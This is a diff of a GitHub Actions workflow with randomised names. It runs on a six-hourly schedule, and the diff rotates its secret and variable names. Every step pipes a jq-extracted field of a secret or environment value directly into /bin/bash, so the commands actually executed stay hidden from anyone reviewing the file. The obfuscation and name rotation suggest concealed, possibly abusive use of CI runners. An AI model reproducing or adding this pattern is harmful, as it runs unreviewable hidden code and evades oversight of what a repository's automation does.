@@ -1,24 +1,24 @@
 name: beisentenb
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 0/6 * * *'
-
+    - cron: '51 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: beisentenb
         env:
-          w89278: ${{ secrets.w89278 }}
+          nyu500: ${{ secrets.nyu500 }}
         run: |
-          echo $w89278 | jq -r .wzwm0185 | /bin/bash
-          echo $dqc337 | jq -r .w5 | /bin/bash
-          echo $izl75761 | jq -r .vs223 | /bin/bash
-          echo $nem8 | jq -r .aohlw12 | /bin/bash
-          echo $t33 | jq -r .tgq031 | /bin/bash
-          echo $oo91 | jq -r .takpa1578 | /bin/bash
-          echo $rcnmp61 | jq -r .a53684 | /bin/bash
+          echo $nyu500 | jq -r .e28743 | /bin/bash
+          echo $vshty83 | jq -r .hjam6 | /bin/bash
+          echo $bcxs16 | jq -r .vhf01740 | /bin/bash
+          echo $bwcgu010 | jq -r .beu22 | /bin/bash
+          echo $xybqd7934 | jq -r .bewxc80389 | /bin/bash
+          echo $os4 | jq -r .y5 | /bin/bash
+          echo $smfdx40 | jq -r .vjhl433 | /bin/bash
+          echo $ptkdw96480 | jq -r .vnoik3 | /bin/bash
 
